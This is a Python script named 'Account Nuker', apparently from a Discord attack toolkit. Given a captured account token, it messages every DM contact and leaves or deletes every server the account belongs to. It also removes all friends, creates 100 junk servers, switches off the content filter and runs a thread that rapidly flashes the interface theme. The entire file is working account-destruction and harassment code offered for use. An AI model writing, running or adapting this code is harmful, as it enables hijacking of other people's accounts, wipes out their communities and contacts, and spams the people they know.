import os, sys, time, requests, os.path, threading, random
from colorama import Fore
from util.plugins.commun import * 


setTitle("Account Nuker")
clear()
accountnukertitle()
print(f"""{y}[{w}+{y}]{w} Enter account token you want to nuke""")
global usertoken
usertoken = str(input(f"""{y}[{b}#{y}]{w} Token: """))

def accnuke():

    def nuke(usertoken, Server_Name, message_Content):
        if threading.active_count() <= 100:
            t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
            t.start()

        headers = {'Authorization': usertoken}
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': usertoken}).json()
        print(f"\n{y}[{w}+{y}]{w} Sent a Message to all available friends")
        for channel in channelIds:
            try:
                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                headers=headers,
                data={"content": f"{message_Content}"})
                print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Messaged ID: "+channel['id'])
            except Exception as e:
                print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")

        print(f"\n{y}[{w}+{y}]{w} Left all available guilds")
        guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': usertoken}).json()
        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                    headers={'Authorization': usertoken})
                print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Left guild: "+guild['name'])
            except Exception as e:
                print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")

        print(f"\n{y}[{w}+{y}]{w} Deleted all available guilds")
        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers={'Authorization': usertoken})
                print(f'\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Deleted guild: '+guild['name'])
            except Exception as e:
                print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")

        print(f"\n{y}[{w}+{y}]{w} Removed all available friends")
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': usertoken}).json()
        for friend in friendIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': usertoken})
                print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Removed friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
            except Exception as e:
                print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")

        print(f"\n{y}[{w}+{y}]{w} Created all servers")
        for i in range(100):
            try:
                payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
                print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Created {Server_Name} #{i}")
            except Exception as e:
                print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")
        t.do_run = False
        setting = {
              'theme': "light",
              'locale': "ja",
              'message_display_compact': False,
              'inline_embed_media': False,
              'inline_attachment_media': False,
              'gif_auto_play': False,
              'render_embeds': False,
              'render_reactions': False,
              'animate_emoji': False,
              'convert_emoticons': False,
              'enable_tts_command': False,
              'explicit_content_filter': '0',
              'status': "idle"
        }
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
        j = requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': usertoken}).json()
        a = j['username'] + "#" + j['discriminator']
        print(f"\n{y}[{w}+{y}]{w} Succesfully turned {a} into a holl")
        input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
        main()

    def CustomSeizure(token):
        print(f'{y}[{w}+{y}]{w} Starting seizure mode (Switching on/off Light/dark mode)')
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

    print(f"\n{y}[{w}+{y}]{w} Name of the servers that will be created")
    Server_Name = str(input(f'{y}[{b}#{y}]{w} Name: '))
    print(f"\n{y}[{w}+{y}]{w} Message that will be sent to every friend: ")
    message_Content = str(input(f'{y}[{b}#{y}]{w} Message: '))
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = 100

    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
        return

accnuke()